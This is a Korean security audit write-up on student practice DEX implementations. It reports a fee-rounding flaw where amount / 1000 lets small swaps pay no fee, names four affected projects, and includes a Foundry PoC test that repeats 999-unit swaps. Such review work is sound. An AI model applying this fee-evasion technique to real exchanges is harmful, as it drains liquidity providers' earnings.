# 구현체 리스트
- https://github.com/rkdnd/DEX
- https://github.com/Jp1n9/Practice-Dex
- https://github.com/procfs-web3/practice_DEX
- https://github.com/Eunyeong2/DEX
- https://github.com/LTaeng/DEX
- https://github.com/dreamwooz3k/wooz3k_dex
- https://github.com/dh-yunjin/practice_DeFi/tree/main/DEX
- https://github.com/Kkyung123/practice_DEX

## Fee가 0이 되는 경우를 고려하지 않음
### 설명
많은 구현체에서, 0.1%의 swap fee를 계산할 때 `amount / 1000` 과 같은 나눗셈 연산을 사용하였다. 그러나, amount가 999일때와 같이 1000에 의해 나누어떨어지지 않는 경우 swap fee가 필요한 것보다 작게 계산된다.
* 취약한 구현체들: LTaeng, wooz3k, Kkyung123, Eunyeong2

### 파급력
Liquidity pool에 예치하는 동기 중 하나는 swap fee redemption이다. 만약 swap fee를 내지 않고 dex 서비스를 이용하는 악의적인 고객이 등장한다면, 해당 dex에 대한 신뢰도가 떨어질 뿐 아니라 liquidity provider들의 동기도 사라진다. 따라서 파급력은 **Medium**으로 평가하였다.

### PoC
```solidity
function testNoFee() public {
    vm.startPrank(alice);
    coinX.approve(address(dexPair), 100 ether);
    coinY.approve(address(dexPair), 100 ether);
    uint256 lptAmount = dexPair.addLiquidity(100 ether, 100 ether, 0);
    vm.stopPrank();

    vm.startPrank(bob);
    coinX.approve(address(dexPair), 100 ether);
    for (uint i = 0; i < 1000; i++) {
        dexPair.swap(999, 0, 0);
    }    
    vm.stopPrank();

    vm.startPrank(alice);
    uint256 balanceBefore = coinX.balanceOf(alice);
    dexPair.removeLiquidity(lptAmount, 0, 0);
    uint256 balanceAfter = coinX.balanceOf(alice);
    assertGt(balanceAfter - balanceBefore, 100 ether + 999 * 1000);
}
```